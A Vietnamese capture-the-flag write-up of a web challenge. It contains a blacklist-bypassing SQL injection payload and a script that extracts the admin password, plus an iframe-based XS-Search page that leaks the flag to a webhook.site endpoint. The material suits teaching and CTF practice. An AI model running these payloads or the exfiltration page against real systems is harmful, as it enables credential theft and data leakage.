# Tổng quan
Mô tả: A secret note. Admin-only!
Nhận xét: Challenge gồm có các chức năng như `/login`, `/logout`, `/notes`, `/api/notes/clear`,`/report` , `/api/bot`, `s3cret`, `/search` FLAG được nằm trong note của session bot. Chỉ có endpoint `/search` là có thể truy cập, các endpoints còn lại cần session admin với có thể truy cập.
--> Mình cần lợi dụng `/search` để lấy được username và password của admin.
# Phân tích
```python
@app.route('/search')
def search():
    id = request.args.get('id')
    if not id:
        return jsonify({'error': 'Missing id parameter'}), 400

    banned = [
        "'", '"',
        "and", "or", "--", "#", "/*", "*/", "+", "-", " ", ";", "\n", "\r", "\t",
        "union", "insert", "update", "delete", "drop", "alter", "create", "replace", "truncate",
        "like", "|",
        "\x0b", "\x0c", "\xa0",
        "iif", "case", "when", "waitfor",
        "exec", "sp_", "xp_",
        "char(", "nchar(", "concat",
        "openrowset", "opendatasource","|"
    ]
    lowered = id.lower()
    if any(tok in lowered for tok in banned):
        return jsonify({'error': 'nice one'}), 403

    con = get_db()
    cur = con.cursor()
    try:
        cur.execute(f"SELECT message FROM users WHERE id = {id}")
        row = cur.fetchone()
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    finally:
        con.close()

    if not row:
        return jsonify({'error': 'User not found'}), 404
    return jsonify({'message': row['message']}), 200
```
Cơ chế hoạt động của endpoint này như sau: Nhận giá trị đầu vào qua tham số `id` và tiến hành kiểm tra chuỗi id nếu bên trong chuỗi có các chuỗi khớp với danh sách mảng `banned` thì sẽ hiện thông báo lỗi. Nếu không có lỗi, `id` sẽ được ghép với chuỗi truy vấn sql để trả về message theo `id`. Từ đó, mình có thể thấy ở endpoint xuất hiện lỗ hổng SQL injection vì `id` được ghép với query SQL và cơ chế lọc cũng không bao phủ được toàn bộ như thiếu `SELECT`, `(`, `)`,.. chẳng hạn.

Truy cập vào database password cần tìm có độ dài 128 kí tự được gán vào cột `passwd_col`, cột này nằm trong bảng users cùng cột id, username và message. Điểm đáng chú ý là tác giả đã tạo ra 256 users với username dạng _b1,_b2,... và message là `chr(i)`. 
```python
def db_setup():
    con = get_db()
    cur = con.cursor()

    needs_rebuild = False
    cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users'")
    if cur.fetchone():
        cur.execute("PRAGMA table_info(users)")
        cols = [r[1] for r in cur.fetchall()]
        if PASSWD_COL not in cols:
            needs_rebuild = True
        else:
            cur.execute("SELECT COUNT(*) FROM users WHERE id BETWEEN 0 AND 255")
            if cur.fetchone()[0] < 256:
                needs_rebuild = True
        if needs_rebuild:
            cur.execute("DROP TABLE users")

    cur.execute(f'''CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY,
                    username TEXT NOT NULL,
                    {PASSWD_COL} TEXT NOT NULL,
                    message TEXT
                )''')

    cur.execute("SELECT COUNT(*) FROM users")
    if cur.fetchone()[0] == 0:
        for i in range(256):
            cur.execute(
                f"INSERT INTO users (id, username, {PASSWD_COL}, message) VALUES (?, ?, ?, ?)",
                (i, f'_b{i}', '', chr(i))
            )
        cur.execute(f"INSERT INTO users (id, username, {PASSWD_COL}, message) VALUES (?, ?, ?, ?)", (1000, 'admin', random_password, 'Hello from admin!'))
        cur.execute(f"INSERT INTO users (id, username, {PASSWD_COL}, message) VALUES (?, ?, ?, ?)", (1001, 'bob', 'bob123', 'Hey its bob here!'))
        cur.execute(f"INSERT INTO users (id, username, {PASSWD_COL}, message) VALUES (?, ?, ?, ?)", (1002, 's1mple', 's1mple@123@123', 'Hey its s1mple here!'))
    else:
        cur.execute(f"UPDATE users SET {PASSWD_COL} = ? WHERE username = 'admin'", (random_password,))
    con.commit()
    con.close()
```
--> Từ 2 nguồn thông tin trên mình sẽ hướng tới tìm tên cột `passwd_col` trước sau đó tìm password admin trong cột đó bằng cách biến `id` thành mã ascii của một ký tự, response trả lại chính kí tự đó. 
Ví dụ:
![](image1.png) 

Cơ chế hoạt động của bot như sau: Trước hết bot sẽ truy cập vào challenge nội bộ `http://127.0.0.1:5000` để đăng nhập bằng account admin, thực hiện ghi FLAG vào note trong trang `/s3cret`, sau đó mới visit URL do client gửi qua `/api/bot`.
```python
import os
import re
import threading

from playwright.sync_api import sync_playwright

FLAG = os.environ.get('FLAG', 'L3AK{fake_flag_for_testing}')
SITE = os.environ.get('SITE', 'http://127.0.0.1:5000')
TIMEOUT_MS = 30000
VISIT_WAIT_MS = 180000
URL_RE = re.compile(r'^https?://.+')


def _visit(url, admin_password):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-dev-shm-usage'])
        context = browser.new_context()

        try:
            setup = context.new_page()
            setup.goto(f'{SITE}/login', wait_until='networkidle', timeout=TIMEOUT_MS)
            setup.fill('input[name="username"]', 'admin')
            setup.fill('input[name="password"]', admin_password)
            setup.click('button.btn')
            setup.wait_for_load_state('networkidle', timeout=TIMEOUT_MS)

            setup.goto(f'{SITE}/s3cret', wait_until='networkidle', timeout=TIMEOUT_MS)
            setup.fill('#entry-box', FLAG)
            setup.click('#save-btn')
            setup.wait_for_load_state('networkidle', timeout=TIMEOUT_MS)
            setup.close()

            visit = context.new_page()
            visit.goto(url, wait_until='networkidle', timeout=TIMEOUT_MS)
            visit.wait_for_timeout(VISIT_WAIT_MS)
        except Exception as e:
            print(f'admin bot error: {e}')
        finally:
            browser.close()


def visit(url, admin_password):
    if not URL_RE.match(url):
        raise ValueError('invalid url')
    threading.Thread(target=_visit, args=(url, admin_password), daemon=True).start()
```
--> Mình dựng một website trong đó khi bot thực hiện visit nó sẽ truy cập vào `/notes?search=` (đây là endpoint tìm note theo nội dung) để dò FLAG.

# Quá trình khai thác
1.Sử dụng intruder trên burpsuite để bruteforce từ vị trí 130-143 trong cột sql của bảng sqlite_master ra `passwd_col` bằng payload:
```sql
/search=(select(unicode(substr(sql,130,1)))from(sqlite_master))
```
2.Tiếp tục bruteforce tới cột vừa tìm được trong bảng users để tìm ra password:
```sql
/search=(select(unicode(substr({passwd_col},1,1)))from(users)where(id=1000))
```
Script để lấy cho chuẩn vì làm bằng intruder khá lâu và dễ nhầm:
```python
import requests

URL = "https://side-channel-surfer.instances.ctf.l3ak.team/"
COL = "passwd_col"

password = ""

for i in range(1, 129):
    payload = f"(select(unicode(substr({COL},{i},1)))from(users)where(id=1000))"
    r = requests.get(f"{URL}/search", params={"id": payload}, timeout=10)
    data = r.json()
    if "message" not in data:
        print(f"[{i}] error:", data)
        break

    ch = data["message"]
    password += ch
print()
print("admin password:")
print(password)
print("length:", len(password))
```
3.Truy cập vào /api/bot để gửi website của mình cho bot visit và trả FLAG về webhook:
```html
<!doctype html>
<html>
<body>
<pre id="out">run</pre>

<script>
const TARGET = "http://127.0.0.1:5000";
const WEBHOOK = "https://webhook.site/d8664b1e-cace-442d-811d-84af9eafcb15";

let flag = "L3AK{";
const charset = "abcdefghijklmnopqrstuvwxyz0123456789_}ABCDEFGHIJKLMNOPQRSTUVWXYZ-!@#$%^&*.,:";

const out = document.getElementById("out");

function log(s) {
  if (out) out.textContent += "\n" + s;
  fetch(WEBHOOK + "?x=" + encodeURIComponent(s), { mode: "no-cors" });
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

async function findNext(prefix) {
  const frames = [];

  for (const c of charset) {
    const f = document.createElement("iframe");
    f.src = TARGET + "/s3cret?search=" + encodeURIComponent(prefix + c);
    f.style.display = "none";
    document.body.appendChild(f);
    frames.push([c, f]);
  }

  await sleep(1500);

  let found = "";

  for (const [c, f] of frames) {
    try {
      if (f.contentWindow.length > 0) {
        found = c;
      }
    } catch (e) {}

    f.remove();
  }

  return found;
}

(async () => {
  log("bat dau: " + flag);

  while (!flag.endsWith("}")) {
    const c = await findNext(flag);

    if (!c) {
      log("khong tim thay: " + flag);
      break;
    }

    flag += c;
    log("flag: " + flag);
  }
})();
</script>
</body>
</html>
```
![](image2.png)
![](image.png)
# FLAG
~~`L3AK{1f_y0u_c4n_c0un7_y0u_c4n_l34k}`~~
